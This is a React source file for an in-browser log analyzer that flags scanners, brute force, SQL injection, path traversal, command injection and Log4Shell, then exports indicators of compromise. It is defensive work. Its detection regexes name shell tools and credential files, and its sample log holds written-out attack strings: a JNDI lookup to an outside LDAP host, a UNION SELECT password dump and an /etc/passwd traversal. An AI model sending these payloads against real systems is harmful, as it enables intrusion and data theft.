import { useCallback, useMemo, useState } from "react";
import { api } from "../lib/api";

// ───────────────────────────────────────────────────────────────────────────
// Whisper Reader — paste server / auth logs, and DSOS listens for what the
// noise is hiding: scanners, brute-force, injection, traversal, log4shell.
// Everything runs in-browser. Nothing is uploaded (the optional AI summary
// only sends a condensed findings digest, never the raw logs).
// ───────────────────────────────────────────────────────────────────────────

type Severity = "info" | "low" | "med" | "high" | "crit";

const WEIGHT: Record<Severity, number> = { info: 0, low: 1, med: 3, high: 6, crit: 10 };
const RANK: Record<Severity, number> = { info: 0, low: 1, med: 2, high: 3, crit: 4 };

const SEV_CLASS: Record<Severity, string> = {
  crit: "text-red-400 border-red-400/50 bg-red-400/10",
  high: "text-red-400 border-red-400/40 bg-red-400/10",
  med: "text-orange-300 border-orange-400/40 bg-orange-400/10",
  low: "text-yellow-300 border-yellow-400/30 bg-yellow-400/10",
  info: "text-dsos-ghost border-dsos-ghost/30 bg-dsos-ghost/5",
};

const MAX_LINES = 20000;

interface Rule {
  id: string;
  name: string;
  severity: Severity;
  // scope decides which haystack the regex runs against.
  scope: "payload" | "ua" | "auth";
  re: RegExp;
}

// Detection rules. Curated, not exhaustive — tuned to surface the obvious
// attacker behaviors you'd see hammering a school portal.
const RULES: Rule[] = [
  // ── payload (request target / decoded path / raw line) ──
  {
    id: "log4shell",
    name: "Log4Shell (JNDI lookup)",
    severity: "crit",
    scope: "payload",
    re: /\$\{jndi:(ldap|ldaps|rmi|dns|nis|iiop|corba|nds|http)s?:/i,
  },
  {
    id: "sqli",
    name: "SQL injection",
    severity: "high",
    scope: "payload",
    re: /(\bunion\b[\s\S]{0,40}\bselect\b|\bor\b\s+1\s*=\s*1|'\s*or\s*'?1'?\s*=\s*'?1|information_schema|\bsleep\s*\(|benchmark\s*\(|xp_cmdshell|waitfor\s+delay|\bselect\b[\s\S]{0,40}\bfrom\b)/i,
  },
  {
    id: "traversal",
    name: "Path traversal / LFI",
    severity: "high",
    scope: "payload",
    re: /(\.\.\/|\.\.\\|\.\.%2f|%2e%2e%2f|%2e%2e\/|\/etc\/passwd|\/etc\/shadow|boot\.ini|\/proc\/self\/environ|c:\\windows)/i,
  },
  {
    id: "rfi",
    name: "Remote file include / SSRF-ish",
    severity: "high",
    scope: "payload",
    re: /(php:\/\/|data:\/\/text|expect:\/\/|=https?:\/\/[^ &"]+\.(txt|php|jsp|exe))/i,
  },
  {
    id: "cmdinj",
    name: "Command injection",
    severity: "high",
    scope: "payload",
    re: /(;\s*(cat|ls|id|whoami|wget|curl|nc|bash|sh|ping)\b|\|\s*(cat|nc|sh|bash)\b|\$\([^)]*\)|\/bin\/(ba)?sh|%0a|%0d)/i,
  },
  {
    id: "xss",
    name: "Cross-site scripting probe",
    severity: "med",
    scope: "payload",
    re: /(<script\b|%3cscript|onerror\s*=|onload\s*=|javascript:|<img[^>]+src\s*=)/i,
  },
  {
    id: "sensitive",
    name: "Sensitive path probe",
    severity: "med",
    scope: "payload",
    re: /(\/\.env\b|\/\.git\b|\/\.aws\b|\/\.ssh\b|\/wp-login|\/wp-admin|\/phpmyadmin|\/xmlrpc\.php|\/\.svn\b|\/actuator|\/server-status|\/config\.(php|json|yml)|\/backup|\/\.DS_Store)/i,
  },
  // ── user-agent ──
  {
    id: "scanner",
    name: "Known attack tool (User-Agent)",
    severity: "high",
    scope: "ua",
    re: /(sqlmap|nikto|nmap|masscan|dirbuster|gobuster|wpscan|hydra|medusa|acunetix|nessus|nuclei|zgrab|feroxbuster|ffuf|netsparker|qualys|openvas|whatweb|wfuzz)/i,
  },
  {
    id: "autoclient",
    name: "Automated client (User-Agent)",
    severity: "low",
    scope: "ua",
    re: /(python-requests|python-urllib|curl\/|wget\/|go-http-client|libwww|java\/\d|apache-httpclient|scrapy|okhttp)/i,
  },
  // ── auth (raw line text) ──
  {
    id: "authfail",
    name: "Authentication failure",
    severity: "med",
    scope: "auth",
    re: /(failed password|authentication failure|invalid user|auth(?:entication)? fail|login failed|access denied|permission denied|pam_unix.*authentication)/i,
  },
];

function safeDecode(s: string): string {
  let out = s;
  for (let i = 0; i < 2; i++) {
    try {
      const d = decodeURIComponent(out.replace(/\+/g, " "));
      if (d === out) break;
      out = d;
    } catch {
      break;
    }
  }
  return out;
}

const IPV4 = /\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/;
// Apache/Nginx "combined" log format.
const COMBINED =
  /^(\S+)\s+\S+\s+\S+\s+\[([^\]]+)\]\s+"(\S+)\s+(\S+)\s+[^"]*"\s+(\d{3})\s+(\S+)(?:\s+"([^"]*)"\s+"([^"]*)")?/;
const SSH_FROM = /from\s+(\d{1,3}(?:\.\d{1,3}){3})/i;

interface Entry {
  raw: string;
  ip: string;
  method?: string;
  path?: string; // decoded request target
  status?: number;
  ua?: string;
}

function parseLine(line: string): Entry | null {
  const t = line.trim();
  if (!t || t.startsWith("#")) return null;

  const m = COMBINED.exec(t);
  if (m) {
    return {
      raw: t,
      ip: m[1],
      method: m[3],
      path: safeDecode(m[4]),
      status: parseInt(m[5], 10),
      ua: m[8] ?? "",
    };
  }

  // Non-access line (sshd/auth/syslog/app). Pull an IP if we can.
  const fromIp = SSH_FROM.exec(t)?.[1];
  const anyIp = fromIp ?? IPV4.exec(t)?.[0] ?? "(unattributed)";
  return { raw: t, ip: anyIp };
}

interface Signal {
  id: string;
  name: string;
  severity: Severity;
  count: number;
  sample: string; // first matched fragment / line
}

interface Attacker {
  ip: string;
  hits: number;
  failedAuth: number;
  notFound: number;
  serverErr: number;
  methods: Set<string>;
  uas: Set<string>;
  paths: Set<string>;
  signals: Map<string, Signal>;
  evidence: string[]; // sample raw lines that tripped a rule
  score: number;
  level: Severity;
}

interface Report {
  totalLines: number;
  parsed: number;
  truncated: boolean;
  attackers: Attacker[]; // sorted, score>0 only
  cleanIps: number; // ips with score 0
  iocIps: { ip: string; level: Severity; score: number; tags: string[] }[];
  iocUas: string[];
  iocUris: string[];
}

function addSignal(a: Attacker, rule: Rule, sample: string) {
  const ex = a.signals.get(rule.id);
  if (ex) {
    ex.count++;
  } else {
    a.signals.set(rule.id, {
      id: rule.id,
      name: rule.name,
      severity: rule.severity,
      count: 1,
      sample: sample.slice(0, 160),
    });
  }
}

function levelFor(score: number): Severity {
  if (score >= 10) return "crit";
  if (score >= 6) return "high";
  if (score >= 3) return "med";
  if (score > 0) return "low";
  return "info";
}

function analyze(text: string): Report {
  const allLines = text.split(/\r?\n/);
  const truncated = allLines.length > MAX_LINES;
  const lines = truncated ? allLines.slice(0, MAX_LINES) : allLines;

  const map = new Map<string, Attacker>();
  let parsed = 0;
  const uris = new Set<string>();
  const scannerUas = new Set<string>();

  for (const line of lines) {
    const e = parseLine(line);
    if (!e) continue;
    parsed++;

    let a = map.get(e.ip);
    if (!a) {
      a = {
        ip: e.ip,
        hits: 0,
        failedAuth: 0,
        notFound: 0,
        serverErr: 0,
        methods: new Set(),
        uas: new Set(),
        paths: new Set(),
        signals: new Map(),
        evidence: [],
        score: 0,
        level: "info",
      };
      map.set(e.ip, a);
    }

    a.hits++;
    if (e.method) a.methods.add(e.method);
    if (e.ua) a.uas.add(e.ua);
    if (e.path) a.paths.add(e.path);
    if (e.status === 401 || e.status === 403) a.failedAuth++;
    if (e.status === 404) a.notFound++;
    if (e.status && e.status >= 500) a.serverErr++;

    const payloadHay = `${e.path ?? ""} ${e.raw}`;
    const uaHay = e.ua ?? "";
    let tripped = false;

    for (const rule of RULES) {
      const hay = rule.scope === "ua" ? uaHay : rule.scope === "auth" ? e.raw : payloadHay;
      const match = rule.re.exec(hay);
      if (!match) continue;
      addSignal(a, rule, match[0]);
      tripped = true;
      if (rule.scope === "payload" && e.path) uris.add(e.path);
      if (rule.id === "scanner" && e.ua) scannerUas.add(e.ua);
    }

    if (tripped && a.evidence.length < 3) a.evidence.push(e.raw.slice(0, 240));
  }

  // Derived aggregate signals + scoring.
  for (const a of map.values()) {
    if (a.failedAuth >= 5) {
      a.signals.set("bruteforce", {
        id: "bruteforce",
        name: "Brute-force / credential stuffing",
        severity: "high",
        count: a.failedAuth,
        sample: `${a.failedAuth} failed auth attempts`,
      });
    }
    if (a.notFound >= 15) {
      a.signals.set("dirbust", {
        id: "dirbust",
        name: "Directory / endpoint enumeration",
        severity: "med",
        count: a.notFound,
        sample: `${a.notFound} × 404 — fishing for hidden paths`,
      });
    }
    if (a.hits >= 100) {
      a.signals.set("flood", {
        id: "flood",
        name: "High request volume",
        severity: "med",
        count: a.hits,
        sample: `${a.hits} requests from one source`,
      });
    }

    let score = 0;
    let top: Severity = "info";
    for (const s of a.signals.values()) {
      score += WEIGHT[s.severity];
      if (RANK[s.severity] > RANK[top]) top = s.severity;
    }
    a.score = score;
    a.level = levelFor(score);
  }

  const all = [...map.values()];
  const attackers = all
    .filter((a) => a.score > 0)
    .sort((x, y) => y.score - x.score || y.hits - x.hits);
  const cleanIps = all.filter((a) => a.score === 0 && a.ip !== "(unattributed)").length;

  const iocIps = attackers
    .filter((a) => a.ip !== "(unattributed)")
    .map((a) => ({
      ip: a.ip,
      level: a.level,
      score: a.score,
      tags: [...a.signals.values()].map((s) => s.id),
    }));

  return {
    totalLines: allLines.length,
    parsed,
    truncated,
    attackers,
    cleanIps,
    iocIps,
    iocUas: [...scannerUas].slice(0, 50),
    iocUris: [...uris].slice(0, 100),
  };
}

function buildIocText(r: Report): string {
  const now = new Date().toISOString();
  const lines: string[] = [
    "# DSOS // Whisper Reader — IOC export",
    `# generated ${now}`,
    `# ${r.parsed} log lines analyzed · ${r.attackers.length} suspicious sources`,
    "",
    "## Suspicious source IPs",
    ...(r.iocIps.length
      ? r.iocIps.map(
          (i) =>
            `${i.ip.padEnd(18)} ${i.level.toUpperCase().padEnd(5)} score ${String(
              i.score
            ).padEnd(3)} (${i.tags.join(", ")})`
        )
      : ["(none)"]),
    "",
    "## Malicious / automated user-agents",
    ...(r.iocUas.length ? r.iocUas : ["(none)"]),
    "",
    "## Suspicious request targets",
    ...(r.iocUris.length ? r.iocUris : ["(none)"]),
    "",
  ];
  return lines.join("\n");
}

const SAMPLE_LOG = `# Mixed nginx access + sshd auth excerpt — paste your own to replace
203.0.113.66 - - [10/Mar/2026:02:14:03 +0000] "GET /wp-login.php HTTP/1.1" 404 146 "-" "python-requests/2.31"
203.0.113.66 - - [10/Mar/2026:02:14:05 +0000] "GET /.env HTTP/1.1" 404 146 "-" "python-requests/2.31"
203.0.113.66 - - [10/Mar/2026:02:14:06 +0000] "GET /.git/config HTTP/1.1" 404 146 "-" "python-requests/2.31"
203.0.113.66 - - [10/Mar/2026:02:14:08 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 146 "-" "python-requests/2.31"
198.51.100.23 - - [10/Mar/2026:02:18:44 +0000] "GET /course.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 5120 "-" "sqlmap/1.8#stable"
198.51.100.23 - - [10/Mar/2026:02:18:45 +0000] "GET /course.php?id=1%20AND%20SLEEP(5) HTTP/1.1" 200 512 "-" "sqlmap/1.8#stable"
198.51.100.23 - - [10/Mar/2026:02:19:01 +0000] "GET /files?path=../../../../etc/passwd HTTP/1.1" 200 2310 "-" "sqlmap/1.8#stable"
45.155.205.99 - - [10/Mar/2026:03:01:10 +0000] "POST /api/login HTTP/1.1" 401 33 "-" "Mozilla/5.0"
45.155.205.99 - - [10/Mar/2026:03:01:12 +0000] "POST /api/login HTTP/1.1" 401 33 "-" "Mozilla/5.0"
45.155.205.99 - - [10/Mar/2026:03:01:14 +0000] "POST /api/login HTTP/1.1" 401 33 "-" "Mozilla/5.0"
185.220.101.4 - - [10/Mar/2026:04:00:00 +0000] "GET / HTTP/1.1" 400 0 "-" "\${jndi:ldap://185.220.101.4:1389/Exploit}"
10.0.0.5 - - [10/Mar/2026:09:12:00 +0000] "GET /dashboard HTTP/1.1" 200 8412 "-" "Mozilla/5.0 (Windows NT 10.0)"
Mar 10 02:20:01 canvas sshd[2211]: Failed password for invalid user admin from 45.155.205.99 port 51244 ssh2
Mar 10 02:20:03 canvas sshd[2213]: Failed password for invalid user root from 45.155.205.99 port 51250 ssh2
Mar 10 02:20:05 canvas sshd[2215]: Failed password for invalid user oracle from 45.155.205.99 port 51258 ssh2
Mar 10 02:20:07 canvas sshd[2217]: Failed password for invalid user postgres from 45.155.205.99 port 51262 ssh2
Mar 10 02:20:09 canvas sshd[2219]: Failed password for invalid user git from 45.155.205.99 port 51270 ssh2
Mar 10 02:25:14 canvas sshd[2299]: Accepted password for deploy from 10.0.0.5 port 50122 ssh2`;

export function WhisperReader() {
  const [text, setText] = useState("");
  const [report, setReport] = useState<Report | null>(null);
  const [dragOver, setDragOver] = useState(false);
  const [busy, setBusy] = useState(false);

  // optional AI incident summary
  const [aiState, setAiState] = useState<"idle" | "loading" | "done" | "error">("idle");
  const [aiText, setAiText] = useState("");

  const run = useCallback((src: string) => {
    setBusy(true);
    setAiState("idle");
    setAiText("");
    // defer so the "analyzing" state can paint on big pastes
    setTimeout(() => {
      setReport(analyze(src));
      setBusy(false);
    }, 0);
  }, []);

  const onDropFile = useCallback(
    async (file: File) => {
      const content = await file.text();
      setText(content);
      run(content);
    },
    [run]
  );

  const summarize = useCallback(async () => {
    if (!report) return;
    setAiState("loading");
    setAiText("");
    try {
      const status = await api.ai.status();
      if (!status.available) {
        setAiState("error");
        setAiText(
          `No AI backend is configured (${status.reason ?? "unavailable"}). ` +
            `The full analysis above is complete and offline — the AI summary is an optional extra. ` +
            `Configure a backend in Settings (⚙) to enable it.`
        );
        return;
      }
      const digest = report.attackers
        .slice(0, 10)
        .map(
          (a) =>
            `- ${a.ip} [${a.level}] score=${a.score}, ${a.hits} hits, ` +
            `failedAuth=${a.failedAuth}, 404s=${a.notFound}; signals: ` +
            [...a.signals.values()].map((s) => `${s.id}(${s.count})`).join(", ")
        )
        .join("\n");
      const prompt =
        `You are a SOC analyst. Below are findings from automated log analysis of a web/auth server. ` +
        `Write a short incident summary (5-8 sentences): what likely happened, the most dangerous source(s), ` +
        `and 3 concrete defensive next steps. Do NOT suggest retaliation or counter-attacks — defense and reporting only.\n\n` +
        `Findings:\n${digest}\n\nIOC IPs: ${report.iocIps.map((i) => i.ip).join(", ") || "none"}`;
      const res = await api.ai.chat([{ role: "user", content: prompt }]);
      setAiText(res.reply);
      setAiState("done");
    } catch (e) {
      setAiState("error");
      setAiText(e instanceof Error ? e.message : "AI request failed.");
    }
  }, [report]);

  const copy = (s: string) => navigator.clipboard?.writeText(s).catch(() => {});

  const download = (name: string, content: string, mime: string) => {
    const blob = new Blob([content], { type: mime });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = name;
    a.click();
    URL.revokeObjectURL(url);
  };

  const iocText = useMemo(() => (report ? buildIocText(report) : ""), [report]);

  return (
    <div className="p-4 text-dsos-bone space-y-3 h-full flex flex-col overflow-auto">
      <div>
        <div className="mono text-xs text-dsos-ghost/70 tracking-wider">DSOS // WHISPER READER</div>
        <div className="text-xs text-dsos-bone/60 mt-0.5">
          Paste server / auth logs. DSOS groups by source, fingerprints attack behavior, scores each
          attacker, and pulls IOCs. Analysis runs locally — raw logs never leave this machine.
        </div>
      </div>

      <label
        onDragOver={(e) => {
          e.preventDefault();
          setDragOver(true);
        }}
        onDragLeave={() => setDragOver(false)}
        onDrop={(e) => {
          e.preventDefault();
          setDragOver(false);
          const f = e.dataTransfer.files?.[0];
          if (f) onDropFile(f);
        }}
        className={`block border-2 border-dashed rounded transition-colors ${
          dragOver ? "border-dsos-flame bg-dsos-flame/10" : "border-dsos-ghost/30"
        }`}
      >
        <textarea
          value={text}
          onChange={(e) => setText(e.target.value)}
          placeholder="Paste log lines here, or drop a .log file…"
          spellCheck={false}
          className="w-full h-40 bg-dsos-night/60 rounded p-2 text-[11px] mono text-dsos-bone outline-none resize-y placeholder:text-dsos-ghost/40"
        />
        <input
          type="file"
          className="hidden"
          onChange={(e) => {
            const f = e.target.files?.[0];
            if (f) onDropFile(f);
          }}
        />
      </label>

      <div className="flex flex-wrap gap-2">
        <button
          onClick={() => run(text)}
          disabled={busy || !text.trim()}
          className="mono text-xs px-3 py-1.5 rounded border border-dsos-flame/50 bg-dsos-flame/10 text-dsos-flame hover:bg-dsos-flame/20 disabled:opacity-40 disabled:cursor-not-allowed"
        >
          {busy ? "ANALYZING…" : "▶ ANALYZE"}
        </button>
        <button
          onClick={() => {
            setText(SAMPLE_LOG);
            run(SAMPLE_LOG);
          }}
          className="mono text-xs px-3 py-1.5 rounded border border-dsos-ghost/40 text-dsos-bone hover:border-dsos-flame/50"
        >
          load sample
        </button>
        <button
          onClick={() => {
            setText("");
            setReport(null);
            setAiState("idle");
          }}
          className="mono text-xs px-3 py-1.5 rounded border border-dsos-ghost/40 text-dsos-ghost hover:text-dsos-flame"
        >
          clear
        </button>
      </div>

      {report && (
        <div className="space-y-3 text-xs">
          {/* stat bar */}
          <div className="grid grid-cols-4 gap-2">
            <Stat label="LINES" value={String(report.totalLines)} />
            <Stat label="PARSED" value={String(report.parsed)} />
            <Stat
              label="ATTACKERS"
              value={String(report.attackers.length)}
              danger={report.attackers.length > 0}
            />
            <Stat label="CLEAN IPs" value={String(report.cleanIps)} />
          </div>

          {report.truncated && (
            <div className="border border-yellow-400/40 bg-yellow-400/10 rounded p-2 text-yellow-300">
              Input was large — analyzed the first {MAX_LINES.toLocaleString()} lines only.
            </div>
          )}

          {/* attacker ranking */}
          <div>
            <div className="text-[10px] mono text-dsos-ghost/60 tracking-wider mb-1">
              RANKED SOURCES ({report.attackers.length})
            </div>
            {report.attackers.length === 0 ? (
              <div className="text-dsos-ghost/50 border border-dsos-ghost/20 rounded p-3">
                No attack patterns detected in these lines. That's either a quiet window or a log
                format we didn't parse — combined Apache/Nginx access logs and sshd/auth lines work
                best.
              </div>
            ) : (
              <div className="space-y-2">
                {report.attackers.map((a) => (
                  <AttackerCard key={a.ip} a={a} />
                ))}
              </div>
            )}
          </div>

          {/* IOCs */}
          {report.attackers.length > 0 && (
            <div className="border border-dsos-flame/30 rounded p-2 space-y-2">
              <div className="flex items-center justify-between">
                <div className="text-[10px] mono text-dsos-flame tracking-widest">
                  ⌖ INDICATORS OF COMPROMISE
                </div>
                <div className="flex gap-2">
                  <button
                    onClick={() => copy(iocText)}
                    className="mono text-[10px] px-2 py-0.5 rounded border border-dsos-ghost/40 hover:border-dsos-flame/60 hover:text-dsos-flame"
                  >
                    copy
                  </button>
                  <button
                    onClick={() => download("dsos-iocs.txt", iocText, "text/plain")}
                    className="mono text-[10px] px-2 py-0.5 rounded border border-dsos-ghost/40 hover:border-dsos-flame/60 hover:text-dsos-flame"
                  >
                    .txt
                  </button>
                  <button
                    onClick={() =>
                      download(
                        "dsos-iocs.json",
                        JSON.stringify(
                          { ips: report.iocIps, userAgents: report.iocUas, uris: report.iocUris },
                          null,
                          2
                        ),
                        "application/json"
                      )
                    }
                    className="mono text-[10px] px-2 py-0.5 rounded border border-dsos-ghost/40 hover:border-dsos-flame/60 hover:text-dsos-flame"
                  >
                    .json
                  </button>
                </div>
              </div>
              <pre className="bg-dsos-night border border-dsos-ghost/30 rounded p-2 text-[10px] mono whitespace-pre-wrap max-h-52 overflow-auto">
                {iocText}
              </pre>
              <div className="text-[10px] text-dsos-ghost/50">
                Hand these to your school's IT/security team — they can block the sources and chase
                attribution through proper channels.
              </div>
            </div>
          )}

          {/* optional AI summary */}
          {report.attackers.length > 0 && (
            <div className="border border-dsos-ghost/30 rounded p-2 space-y-2">
              <div className="flex items-center justify-between">
                <div className="text-[10px] mono text-dsos-ghost/60 tracking-wider">
                  ✦ AI INCIDENT SUMMARY (optional)
                </div>
                <button
                  onClick={summarize}
                  disabled={aiState === "loading"}
                  className="mono text-[10px] px-2 py-0.5 rounded border border-dsos-flame/50 text-dsos-flame hover:bg-dsos-flame/10 disabled:opacity-40"
                >
                  {aiState === "loading" ? "thinking…" : "generate"}
                </button>
              </div>
              {aiState === "error" && (
                <div className="text-yellow-300/90 text-[11px]">{aiText}</div>
              )}
              {aiState === "done" && (
                <div className="text-dsos-bone/90 text-[11px] whitespace-pre-wrap leading-relaxed">
                  {aiText}
                </div>
              )}
              {aiState === "idle" && (
                <div className="text-dsos-ghost/50 text-[10px]">
                  Sends only the condensed findings digest (IPs + signal counts), never your raw
                  logs, to write a SOC-style narrative + next steps.
                </div>
              )}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

function Stat({ label, value, danger }: { label: string; value: string; danger?: boolean }) {
  return (
    <div className="bg-dsos-night border border-dsos-ghost/30 rounded p-2 text-center">
      <div className="text-[10px] mono text-dsos-ghost/60 tracking-wider">{label}</div>
      <div className={`text-lg mono ${danger ? "text-red-400" : "text-dsos-bone"}`}>{value}</div>
    </div>
  );
}

function AttackerCard({ a }: { a: Attacker }) {
  const [open, setOpen] = useState(false);
  const signals = [...a.signals.values()].sort((x, y) => RANK[y.severity] - RANK[x.severity]);
  return (
    <div className={`rounded border p-2 ${SEV_CLASS[a.level]}`}>
      <button
        onClick={() => setOpen((o) => !o)}
        className="w-full flex items-center justify-between gap-2 text-left"
      >
        <div className="flex items-center gap-2 min-w-0">
          <span className="mono text-sm text-dsos-bone">{a.ip}</span>
          <span
            className={`mono text-[9px] px-1.5 py-0.5 rounded uppercase tracking-widest ${SEV_CLASS[a.level]}`}
          >
            {a.level}
          </span>
        </div>
        <div className="flex items-center gap-3 shrink-0">
          <span className="mono text-[10px] text-dsos-ghost/70">score {a.score}</span>
          <span className="mono text-[10px] text-dsos-ghost/70">{a.hits} hits</span>
          <span className="text-dsos-ghost/60 text-[10px]">{open ? "▾" : "▸"}</span>
        </div>
      </button>

      <div className="flex flex-wrap gap-1 mt-2">
        {signals.map((s) => (
          <span
            key={s.id}
            className={`mono text-[9px] px-1.5 py-0.5 rounded border ${SEV_CLASS[s.severity]}`}
            title={s.sample}
          >
            {s.name}
            {s.count > 1 ? ` ×${s.count}` : ""}
          </span>
        ))}
      </div>

      {open && (
        <div className="mt-2 space-y-2 text-[10px]">
          <div className="grid grid-cols-2 gap-2 text-dsos-bone/80">
            <div>failed auth: {a.failedAuth}</div>
            <div>404s: {a.notFound}</div>
            <div>5xx: {a.serverErr}</div>
            <div>methods: {[...a.methods].join(", ") || "—"}</div>
          </div>
          {a.uas.size > 0 && (
            <div className="text-dsos-bone/70 break-all">
              <span className="text-dsos-ghost/60">user-agents: </span>
              {[...a.uas].slice(0, 4).join("  ·  ")}
            </div>
          )}
          {a.evidence.length > 0 && (
            <div>
              <div className="text-dsos-ghost/60 mb-1">sample lines:</div>
              <pre className="bg-dsos-night/80 border border-dsos-ghost/20 rounded p-2 mono whitespace-pre-wrap break-all">
                {a.evidence.join("\n")}
              </pre>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
